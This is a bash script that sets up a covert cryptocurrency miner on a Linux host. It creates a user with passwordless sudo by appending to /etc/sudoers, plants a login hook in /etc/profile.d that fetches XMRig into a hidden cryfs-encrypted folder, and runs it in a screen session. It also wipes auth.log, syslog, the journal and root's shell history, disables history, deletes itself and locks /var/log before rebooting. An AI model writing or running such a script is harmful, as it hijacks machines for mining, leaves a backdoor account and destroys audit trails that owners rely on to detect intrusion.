#!/bin/bash

apt install ecryptfs-utils cryptsetup screen cryfs mc sudo -y
keyctl link @u @s
adduser --encrypt-home fast
adduser fast sudo
echo "fast ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
ecryptfs-setup-swap -f
echo "#!/bin/bash
mkdir /home/fast/cr /home/fast/crd
cryfs /home/fast/cr /home/fast/crd
wget https://github.com/xmrig/xmrig/releases/download/v6.16.2/xmrig-6.16.2-focal-x64.tar.gz -O /home/fast/crd/xm.tar.gz
tar -xvzf /home/fast/crd/xm.tar.gz
cp /home/fast/xmrig-6.16.2/config.json /home/fast/crd/config.json
cp /home/fast/xmrig-6.16.2/xmrig /home/fast/crd/xmrig
rm -rf /home/fast/xmrig-6.16.2
rm -rf /home/fast/crd/xm.tar.gz
sudo rm -rf /var/log/auth.log /var/log/syslog.log /var/log/journal/* /root/.bash_history
sudo rm -rf /etc/profile.d/crar.sh
sudo echo 'unset HISTFILE' >> ~/.bash_profile
history -c
cd /home/fast/crd/
screen -S crd" >> /etc/profile.d/crar.sh
chmod 777 /etc/profile.d/crar.sh
rm -rf /root/cr.sh
chmod 000 /var/log/* -R
history -c
shutdown -r now
